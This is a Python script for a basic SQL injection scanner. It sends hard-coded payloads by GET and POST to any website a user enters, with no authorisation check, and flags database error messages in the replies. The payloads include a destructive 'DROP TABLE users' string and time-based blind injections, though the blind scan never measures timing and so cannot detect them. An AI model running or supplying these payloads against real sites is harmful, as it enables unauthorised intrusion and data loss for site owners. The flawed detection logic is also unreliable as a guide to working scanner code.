import requests

class PayloadGenerator:
    """
    Handles the generation of SQL injection payloads.
    """
    def __init__(self):
        self.payloads = []

    def generate_basic_payloads(self):
        self.payloads = [
            "' OR '1'='1", 
            "'; DROP TABLE users;--", 
            "' OR 1=1--", 
            "' AND 1=2--", 
            "' UNION SELECT NULL--"
        ]
        print("check the basic palyloads")
        return self.payloads

    def generate_blind_payloads(self):
        self.payloads = [
            "' AND SLEEP(5)--",
            "' OR SLEEP(5)--",
            "' AND BENCHMARK(1000000,MD5(1))--",
            "' OR IF(1=1,SLEEP(5),0)--"
        ]
        print("check the blind palyloads")
        return self.payloads

    def add_custom_payload(self, payload):
        self.payloads.append(payload)
        print("check the custom palyloads")

    def get_payloads(self):
        print("check the get method palyloads")
        return self.payloads


class RequestHandler:
    """
    Handles sending HTTP requests for scanning.
    """
    @staticmethod
    def send_get_request(url, payload):
        try:
            response = requests.get(url + payload)
            return response.text
        except requests.RequestException as e:
            return f"Error: {str(e)}"

    @staticmethod
    def send_post_request(url, data):
        try:
            response = requests.post(url, data=data)
            return response.text
        except requests.RequestException as e:
            return f"Error: {str(e)}"


class ResponseAnalyzer:
    """
    Analyzes HTTP responses for SQL injection indicators.
    """
    def __init__(self):
        self.error_keywords = [
            "SQL syntax", "database error", "you have an error in your SQL",
            "unclosed quotation mark", "ORA-", "unexpected end of SQL command"
        ]

    def analyze_response(self, response_text):
        for keyword in self.error_keywords:
            if keyword in response_text:
                return True
        return False


class Logger:
    """
    Handles logging of scan results.
    """
    def __init__(self):
        self.logs = []

    def log_success(self, url, payload):
        self.logs.append(f"[SUCCESS] SQL Injection found at {url} with payload: {payload}")

    def log_failure(self, url, payload):
        self.logs.append(f"[FAILURE] No SQL Injection found at {url} with payload: {payload}")

    def print_logs(self):
        for log in self.logs:
            print(log)


class SQLInjectionScanner:
    """
    Core class for SQL Injection scanning. Contains 5 functions.
    """
    def __init__(self):
        self.payload_generator = PayloadGenerator()
        self.request_handler = RequestHandler()
        self.response_analyzer = ResponseAnalyzer()
        self.logger = Logger()

    def scan_get(self, url):
        """
        Scans a URL using GET requests.
        """
        payloads = self.payload_generator.generate_basic_payloads()
        for payload in payloads:
            response = self.request_handler.send_get_request(url, payload)
            if self.response_analyzer.analyze_response(response):
                self.logger.log_success(url, payload)
            else:
                self.logger.log_failure(url, payload)

    def scan_post(self, url, post_data):
        """
        Scans a URL using POST requests.
        """
        payloads = self.payload_generator.generate_basic_payloads()
        for payload in payloads:
            post_data["input"] = payload  # Assumes 'input' is a POST parameter
            response = self.request_handler.send_post_request(url, post_data)
            if self.response_analyzer.analyze_response(response):
                self.logger.log_success(url, payload)
            else:
                self.logger.log_failure(url, payload)

    def scan_with_blind_payloads(self, url):
        """
        Scans a URL using blind SQL injection payloads.
        """
        payloads = self.payload_generator.generate_blind_payloads()
        for payload in payloads:
            response = self.request_handler.send_get_request(url, payload)
            if self.response_analyzer.analyze_response(response):
                self.logger.log_success(url, payload)
            else:
                self.logger.log_failure(url, payload)

    def add_custom_payload_and_scan(self, url, payload):
        """
        Adds a custom payload and scans the URL.
        """
        self.payload_generator.add_custom_payload(payload)
        response = self.request_handler.send_get_request(url, payload)
        if self.response_analyzer.analyze_response(response):
            self.logger.log_success(url, payload)
        else:
            self.logger.log_failure(url, payload)

    def show_logs(self):
        """
        Displays all logs from the scanning process.
        """
        self.logger.print_logs()


# Example Usage
if __name__ == "__main__":
    print("check the SQL injection")
    scanner = SQLInjectionScanner()
    test_url = input("enter the website to check sql injection attack: ")
    test_url = test_url+"/product?id="
    
    # Perform a GET scan
    print ("scan the get method")
    scanner.scan_get(test_url)
    

    # Perform a POST scan
    print ("scan the post method")
    test_data = {"input": ""}
    scanner.scan_post(test_url, test_data)
    

    # Perform a blind SQL injection scan
    print ("scan the test url")
    scanner.scan_with_blind_payloads(test_url)
    

    # Add a custom payload and scan
    print ("scan the all playlods")
    scanner.add_custom_payload_and_scan(test_url, "' OR 1=1;--")
    

    # Display logs
    print ("scan the all logs")
    scanner.show_logs()
    
    print("SQL injection scanner is end")
    print("have a nice day")
